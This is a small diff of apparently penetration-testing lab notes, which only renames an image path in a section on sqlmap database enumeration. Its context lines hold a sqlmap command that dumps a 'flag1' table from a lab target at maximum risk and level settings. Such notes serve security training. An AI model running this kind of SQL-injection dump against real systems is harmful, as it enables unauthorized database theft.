@@ -96,7 +96,7 @@ e=U -D testdb
 sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' -T flag1 --dump --batch --risk 3 --level 5 --dbms MYSQL -D testdb
 ```
 
-<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Advanced Database Enumeration
 
